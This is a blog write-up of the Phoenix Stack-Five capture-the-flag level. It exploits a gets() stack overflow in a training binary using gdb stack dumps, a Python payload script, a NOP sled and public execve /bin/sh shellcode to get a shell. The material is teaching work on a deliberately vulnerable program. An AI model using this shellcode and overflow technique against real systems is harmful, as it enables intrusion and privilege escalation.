---
title: Phoenix Stack-Five
author: Marius Kimmina
date: 2019-11-24 14:10:00 +0800
categories: [CTF, Binary Exploitation]
tags: [Buffer Overflow]
published: true
---

### 0x0. Introduction
For a full introduction to this series and setup description please look at the first post (Phoenix Stack-Zero and One).
This level aims to introduce its participants to the concept of shell-code, thus allowing us to execute code that was not originally
part of the program. For this challenge there is no clear goal as to what we want to achieve.

### 0x1 taking a look at the source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

As you can see there is nothing more to this program then a buffer and a gets call, a standard bufferoverflow. This time we don't want to manipulate existing parts of the program but much rather we would like to create a new part of the program.

##### What can we do with this?

Short answer: A lot.  
Longer answer: We could use this to execute a shell (/bin/sh) and if the program has more privileges then we do, we can use that for privilege escalation. Lets say the program has root-privileges because it needs them for some arbitrary reason, a shell spawned by this program would then be a root shell and give us total control of the system.


### Exploiting the program

To find out how much input exactly the program can take before the buffer overflows I wanted to use the alphabet again, no luck tho this time the buffer could handle that. Also, yes, i could have looked in the source code and realise that "char buffer[128];" is quite a bit larger this time and yes one could also do the math to find out exactly how much input is needed. Fuzzing is more fun tho.

```
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
[Inferior 1 (process 328) exited normally]
```

Fear not tho, there are also lowercase letters with which we can go even further.
I came up with the following padding for my overflow where I "AAAA" at the end is overwriting the return pointer:
```
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZaaaabbbbccccddddeeeefffgggghhhhiiiijjjjkkkAAAA
```

Now after the buffer we start overwriting the return pointer, which leads to a segmentation fault because the address we tried to return to with our test input does not exists. That's not really what we want tho, we want the program to return to an existing area of memory, one that we control, that's the stack.
Next thing I did was to set a breakpoint at the end of "start_level" function to observe the stack

```
(gdb) disassemble start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:	push   rbp
   0x000000000040058e <+1>:	mov    rbp,rsp
   0x0000000000400591 <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:	lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:	mov    rdi,rax
   0x000000000040059c <+15>:	call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:	nop
   0x00000000004005a2 <+21>:	leave  
   0x00000000004005a3 <+22>:	ret    
End of assembler dump.
(gdb) break *0x4005a1
Breakpoint 1 at 0x4005a1
```

We also have to take a look at main to find the Address that we want to return to


```
Dump of assembler code for function main:
   0x00000000004005a4 <+0>:	push   rbp
   0x00000000004005a5 <+1>:	mov    rbp,rsp
   0x00000000004005a8 <+4>:	sub    rsp,0x10
   0x00000000004005ac <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005af <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004005b3 <+15>:	mov    edi,0x400620
   0x00000000004005b8 <+20>:	call   0x400400 <puts@plt>
   0x00000000004005bd <+25>:	mov    eax,0x0
   0x00000000004005c2 <+30>:	call   0x40058d <start_level>
   0x00000000004005c7 <+35>:	mov    eax,0x0
   0x00000000004005cc <+40>:	leave  
   0x00000000004005cd <+41>:	ret    
End of assembler dump.
```

As you can see "0x00000000004005c7" is the next address after "start_level" so that's the original return address. Why do we need to know this? Because that's the address we will look out for on the stack.
So now lets run the program with some simple input....how about the alphabet?....and then we will take a look at the stack

```
(gdb) run
Starting program: /opt/phoenix/amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

(gdb) x/48wx $rsp
0x7fffffffe480:	0x41414141	0x42424242	0x43434343	0x44444444
0x7fffffffe490:	0x45454545	0x46464646	0x47474747	0x48484848
0x7fffffffe4a0:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0x7fffffffe4b0:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0x7fffffffe4c0:	0x51515151	0x52525252	0x53535353	0x54545454
0x7fffffffe4d0:	0x55555555	0x56565656	0x57575757	0x58585858
0x7fffffffe4e0:	0x59595959	0x5a5a5a5a	0xf7db0000	0x00007fff
0x7fffffffe4f0:	0xffffe578	0x00007fff	0xffffe520	0x00007fff
0x7fffffffe500:	0xffffe520	0x00007fff	0x004005c7	0x00000000
0x7fffffffe510:	0xffffe578	0x00007fff	0x00000000	0x00000002
0x7fffffffe520:	0x00000002	0x00000000	0xf7d8fd62	0x00007fff
0x7fffffffe530:	0x00000000	0x00000000	0xffffe570	0x00007fff
```

And can you find the return address? If not take a closer look at this line "0x7fffffffe500:	0xffffe520	0x00007fff	0x004005c7	0x00000000".
But now we still need to find the exact point to overwrite the return address. You can of course try to figure that out on your own or you just use this

```
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZaaaabbbbccccddddeeeefffgggghhhhiiAAAAAAAA
```

Now we only need to replace the "AAAAAAAA" at the end of the string with a return address of our choice. So lets jump to the beginning of the stack "0x7fffffffe480". which we need to transform to little endian and already format it for the exploit "\x80\xe4\xff\xff\xff\x7f"

```
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZaaaabbbbccccddddeeeefffgggghhhhii\x80\xe4\xff\xff\xff\x7f
``


##### A simple proof of concept

I prepared a simple python script 

```py
padding = "AAAABBBBCCCCDDDD\xcc\xcc\xcc\xccFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZaaaabbbbccccddddeeeefffgggghhhhii"
ret_address = "\xa0\xe4\xff\xff\xff\x7f" 
print(padding + ret_address)
```

Here my return address points back to the stack, to exactly the location where i placed some "/xcc" instruction, which are used by debuggers to set a breakpoint.

```
user@phoenix-amd64:/tmp$ python exploit.py > payload

(gdb) run < /tmp/payload
```

We then hit our breakpoint and the stack looks like this


```
(gdb) x/48wx $rsp
0x7fffffffe490:	0x41414141	0x42424242	0x43434343	0x44444444
0x7fffffffe4a0:	0xcccccccc	0x46464646	0x47474747	0x48484848
0x7fffffffe4b0:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0x7fffffffe4c0:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0x7fffffffe4d0:	0x51515151	0x52525252	0x53535353	0x54545454
0x7fffffffe4e0:	0x55555555	0x56565656	0x57575757	0x58585858
0x7fffffffe4f0:	0x59595959	0x615a5a5a	0x62616161	0x63626262
0x7fffffffe500:	0x64636363	0x65646464	0x66656565	0x67676666
0x7fffffffe510:	0x68686767	0x69696868	0xffffe4a0	0x00007fff
0x7fffffffe520:	0xffffe588	0x00007fff	0x00000000	0x00000001
0x7fffffffe530:	0x00000001	0x00000000	0xf7d8fd62	0x00007fff
0x7fffffffe540:	0x00000000	0x00000000	0xffffe580	0x00007fff
```

You can see the return address in this line: 0x7fffffffe510:	0x68686767	0x69696868	0xffffe4a0	0x00007fff  
Which will lead to us jumping here: 0x7fffffffe4a0:	0xcccccccc	0x46464646	0x47474747	0x48484848  

Lets continue the execution of the program

```
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0x00007fffffffe4a1 in ?? ()
```

Awesome. The CC instruction got executed. 



##### Getting shellcode to exploit the program

There is a lot of excellent shellcode for this out there on the Internet, so I am not going to bother with writing my own. 
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"  

We replace the CC instruction from my PoC with the shellcode and trim our payload accordingly.
The adjusted version of my python script then looks like this:

```py
padding = "AAAABBBBCCCCDDDD\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05LLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZaaaabbbbccccddddeeeefffgggghhhhiii"
ret_address = "\xa0\xe4\xff\xff\xff\x7f" 
print(padding + ret_address)
```

And Executing it leads to:

```
user@phoenix-amd64:/tmp$ python exploit.py > payload

(gdb) run < /tmp/payload 
Starting program: /opt/phoenix/amd64/stack-five < /tmp/payload
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004005a1 in start_level ()

(gdb) x/48wx $rsp
0x7fffffffe490:	0x41414141	0x42424242	0x43434343	0x44444444
0x7fffffffe4a0:	0xbb48c031	0x91969dd1	0xff978cd0	0x53dbf748
0x7fffffffe4b0:	0x52995f54	0xb05e5457	0x4c050f3b	0x4d4c4c4c
0x7fffffffe4c0:	0x4e4d4d4d	0x4f4e4e4e	0x504f4f4f	0x51505050
0x7fffffffe4d0:	0x52515151	0x53525252	0x54535353	0x55545454
0x7fffffffe4e0:	0x56555555	0x57565656	0x58575757	0x59585858
0x7fffffffe4f0:	0x5a595959	0x61615a5a	0x62626161	0x63636262
0x7fffffffe500:	0x64646363	0x65656464	0x66666565	0x67676766
0x7fffffffe510:	0x68686867	0x69696968	0xffffe4a0	0x00007fff
0x7fffffffe520:	0xffffe588	0x00007fff	0x00000000	0x00000001
0x7fffffffe530:	0x00000001	0x00000000	0xf7d8fd62	0x00007fff
0x7fffffffe540:	0x00000000	0x00000000	0xffffe580	0x00007fff

(gdb) c
Continuing.
process 468 is executing new program: /bin/dash
```

But wait, where is our shell? Well there are two more problem we have to take care of.


##### NOPs for stack safety

What do I mean by "stack safety"? Well, the start address of the stack can change depending on environment variables, for example the path that you are in. If you execute the program from /opt/phoenix/amd64/ the stack will start later than if you execute the program from /tmp because /opt/phoenix/amd64/ is longer and takes more space.

So since our shellcode does not need all the space available on the stack, its best to fill our Stack with a lot of NOPs (No Operation) Opcodes (x90) and then just jump somewhere in the middle of the nops. Here is how I adjusted my python script for that

```py
nops = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKL"
ret_address = "\xb0\xe4\xff\xff\xff\x7f" 
print(nops + shellcode + padding + ret_address)
```

I added a bunch of \x90s at the beginning and removed letters after our shellcode so that our return address will still be in the right place. I then also changed the return address to jump to somewhere in the middle of all those NOPs. Lets look at the stack with this input in gdb:

```
(gdb) x/48wx $rsp
0x7fffffffe490:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4c0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4d0:	0xbb48c031	0x91969dd1	0xff978cd0	0x53dbf748
0x7fffffffe4e0:	0x52995f54	0xb05e5457	0x58050f3b	0x59585858
0x7fffffffe4f0:	0x5a595959	0x61615a5a	0x62626161	0x63636262
0x7fffffffe500:	0x64646363	0x65656464	0x66666565	0x67676766
0x7fffffffe510:	0x68686867	0x69696968	0xffffe490	0x00007fff
0x7fffffffe520:	0xffffe588	0x00007fff	0x00000000	0x00000001
0x7fffffffe530:	0x00000001	0x00000000	0xf7d8fd62	0x00007fff
0x7fffffffe540:	0x00000000	0x00000000	0xffffe580	0x00007fff
```



##### A shell needs input

When we execute the shell with our exploit it expects input, from stdin. But we used a program and redirected it's stdout into the input of the shell and once our program was done executing /bin/dash it closed the pipe, hence the shell had no way to get any input and just exits.  
There is a trick to get around that tho, when we use "cat" without any input it simply redirects its stdin to its stdout. We can chain our input and cat together and redirect their combined output into ./stack-five. As far as I know that is not possible from within gdb tho, good thing that we added some NOPs so we can execute it from anywhere.  

```
user@phoenix-amd64:/tmp$ (python exploit.py ; cat) | /opt/phoenix/amd64/stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
whoami
phoenix-amd64-stack-five
```

Done. Now isn't that beautiful? We got a Program with basically no intended functionality to execute a shell for us. Sadly it is not a root shell since the program does not have root privileges but at least to me it's quite pleasant anyway :)

